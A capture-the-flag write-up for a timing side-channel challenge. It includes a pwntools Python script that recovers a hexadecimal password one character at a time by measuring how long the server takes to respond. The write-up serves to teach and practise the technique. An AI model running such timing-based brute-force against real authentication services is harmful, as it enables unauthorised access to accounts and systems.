# Time will tell

## Description

<small>Author: @aenygma</small><br><br>A side channel timing attack. <br> Figure out the password in 90 seconds before connection terminates. <br> The password is dynamic and changes every connection session. <br>
<br><b>NOTE, the password is eight characters long and will be hexadecimal.</b> <br><br> <b>Press the <code>Start</code> button on the top-right to begin this challenge.</b>


## Files

* [app.py](<files/app.py>)

## Solution

This is a programming challenge where we are responsible for exploiting a timing attack against a password validation tool. The threshold is `0.1` seconds of "compute time" added to each check that the password checker makes. I created a more generic script that will get the length and generate the password based on the character combination that took the longest time.

I am certain this can be optimized, but this is what I used:
```python
from pwn import *
import sys
import time

# Connect to the remote server
s = remote(sys.argv[1], int(sys.argv[2]))
chars = "0123456789abcdef"

# Get the length
times = {}
s.recvuntil(b": ")
for i in range(50):
        password = "0" * i
        s.sendline(password.encode())
        print(f"Trying length {i}")
        start = time.time()
        d = s.recvuntil(b": ")
        end = time.time()
        times[i] = end - start
length = max(times, key=times.get)
print(f"Length is {length}")
last_time = 0
iter_1 = 0
iter_2 = length - 1
password = "0" * length

# Attempt passwords
for i in range(length):
    times = {}
    for c in chars:
        password = password[:i] + c + "0" * iter_2
        s.sendline(password.encode())
        print(f"Trying combination {password}")
        start = time.time()
        d = s.recvuntil(b": ")
        if b"flag" in d:
            print(d)
            s.interactive()
        end = time.time()
        times[c] = end - start
    nchar = max(times, key=times.get)
    password = password[:i] + nchar + "0" * iter_2
    iter_2 -= 1
```